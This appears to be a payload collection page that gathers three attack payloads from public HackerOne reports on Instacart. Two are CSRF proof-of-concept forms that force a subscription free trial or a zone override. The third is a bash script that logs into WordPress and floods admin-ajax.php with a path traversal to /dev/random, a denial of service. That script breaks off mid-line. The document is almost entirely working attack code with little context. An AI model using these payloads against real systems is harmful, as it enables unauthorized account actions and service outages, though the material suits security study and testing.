# Instacart

3 payloads.

### `6d979a2e`

```
<html>
  <body>
    <form action="https://target.com/api/v2/zones" method="POST">
      <input type="hidden" name="zip" value="10001" />
      <input type="hidden" name="override" value="true" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

— [Cross-Site Request Forgery (CSRF)](https://hackerone.com/reports/157993) · Instacart · [malcolmx](https://hackerone.com/malcolmx)

### `0584761d`

```
#!/bin/bash
target="http://<target>"
username="subscriber"
password="password"
cookiejar=$(mktemp)
   
# login
curl --cookie-jar "$cookiejar" \
   --data "log=$username&pwd=$password&wp-submit=Log+In&redirect_to=%2f&testcookie=1" \
   "$target/wp-login.php" \
   >/dev/null 2>&1
   
# exhaust apache
for i in `seq 1 1000`
   do
      curl --cookie "$cookiejar" \
      --data "plugin=../../../../../../../../../../dev/random&action=update-plugin" \
      "$target/wp-admin/admin-ajax.php" \
      >/d
```

**Parameter:** `plugin`
— [WordPress Authentication Denial of Service](https://hackerone.com/reports/163307) · Instacart · [clizsec](https://hackerone.com/clizsec) · $100.0

### `21146915`

```
<!doctype html>
<html>
<head>
</head> 
<body>
<form action="https://target.com/v3/subscriptions" method="POST">
<input type="hidden" name="free_trial" id="free_trial" value="true">
<input type="hidden" name="promo" id="promo" value="true">
<input type="hidden" name="term" id="term" value="year">
<input type="submit">
</form>
</body>
</html>
```

— [CSRF Trial 14 days express subscription](https://hackerone.com/reports/334139) · Instacart · [tolo7010](https://hackerone.com/tolo7010)
